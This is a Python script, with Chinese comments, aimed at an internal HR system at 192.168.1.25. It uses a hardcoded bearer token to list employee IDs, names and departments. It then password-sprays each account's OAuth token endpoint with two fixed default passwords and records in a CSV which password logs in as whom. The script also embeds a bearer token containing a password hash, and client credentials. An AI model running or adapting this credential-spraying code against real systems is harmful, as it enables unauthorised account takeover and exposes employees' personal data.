import csv

import requests

# 想要获取的员工信息数量
num=100

session = requests.session()

session.headers.update({
    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsb2dpblVzZXIiOnsiYWNjb3VudElkIjoiODgyMDYxMzY0NTQzMjM0MDQ4MCIsInRlbmFudElkIjpudWxsLCJsb2dpbkFjY291bnQiOiIwMDI0NTA2NCIsImxvZ2luUGFzc3dvcmQiOiIkMmEkMTAkN0tnMmxJZ0xDVnFwSER0ZGZvcFEyZU44MXhmSGIxaG8zcHJFc2ZUOEk1MDU5RnJrY244QXEiLCJhY2NvdW50TmFtZSI6bnVsbCwic3RhdHVzIjoiMCIsInBlcm1pc3Npb25zIjpudWxsLCJyb2xlcyI6bnVsbCwiZGF0YVNjb3BlIjpudWxsLCJ1c2VybmFtZSI6IjAwMjQ1MDY0IiwicGFzc3dvcmQiOiIkMmEkMTAkN0tnMmxJZ0xDVnFwSER0ZGZvcFEyZU44MXhmSGIxaG8zcHJFc2ZUOEk1MDU5RnJrY244QXEifSwiZXhwIjoxNzcyMzAwMDEwLCJ1c2VyX25hbWUiOiIwMDI0NTA2NCIsImp0aSI6ImE3YWM2NzdlLTRiYmYtNDcyYy1iNDI5LThhZTllNzBjNTUxMCIsImNsaWVudF9pZCI6Im1hcmNoIiwic2NvcGUiOlsiYWxsIl19.grgNhRsvxKzqTUyNFNd7iPREAoIFoPtoTZQcWbrWkLU",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
    "menuCode": "8712698855247806464",
    "moduleCode": ""
})

resp = session.get(f"http://192.168.1.25/api/pfmc-asist/pfmcOrgEmp/listEmpByOrgId?pageNum=1&pageSize={num}")

# print(resp.json())
resp_data = resp.json()["data"]
data_list = resp_data["list"]

with open("../res/emp_info.csv", "w", encoding="utf-8", newline="") as f:
    writer = csv.writer(f)
    writer.writerow(["工号", "姓名 ", "部门", "密码"])
    for i in range(len(data_list)):
        empNumber = data_list[i]["empNumber"]
        empName = data_list[i]["empName"]
        orgFullName = data_list[i]["orgFullName"]
        writer.writerow([empNumber, empName, orgFullName, ""])

session.close()

session = requests.session()

session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
})
url = "http://192.168.1.25/march/march-oauth/oauth/token"

# 读取没有密码的员工信息文件
with open("../res/emp_info.csv", "r", encoding="utf-8", newline="") as f:
    reader = csv.reader(f)
    next(reader)
    rows = list(reader)

# 在员工信息文件的密码列中添加密码
with open("../res/emp_info_test.csv", "w", encoding="utf-8", newline="") as f:
    writer = csv.writer(f)
    writer.writerow(["工号", "姓名 ", "部门", "密码"])
    for row in rows:
        empNumber = row[0]
        empName = row[1]
        orgFullName = row[2]
        final_password = ""

        data1 = {
            "grant_type": "password",
            "scope": "all",
            "username": f'{{"username":"{empNumber}"}}',
            "password": "mhMH12@@",
            "client_id": "march",
            "client_secret": "march"
        }
        print("正在验证" + empNumber, empName, "mhMH12@@")
        resp = session.post("http://192.168.1.25/march/march-oauth/oauth/token", data=data1)

        if resp.status_code == 200:
            final_password = "mhMH12@@"

        data2 = {
            "grant_type": "password",
            "scope": "all",
            "username": f'{{"username":"{empNumber}"}}',
            "password": "HYZdevadmin1234",
            "client_id": "march",
            "client_secret": "march"
        }
        print("正在验证" + empNumber, empName, "HYZdevadmin1234")
        resp2 = session.post(url, data=data2)
        if resp2.status_code == 200:
            final_password = "HYZdevadmin1234"

        writer.writerow([empNumber, empName, orgFullName, final_password])

session.close()
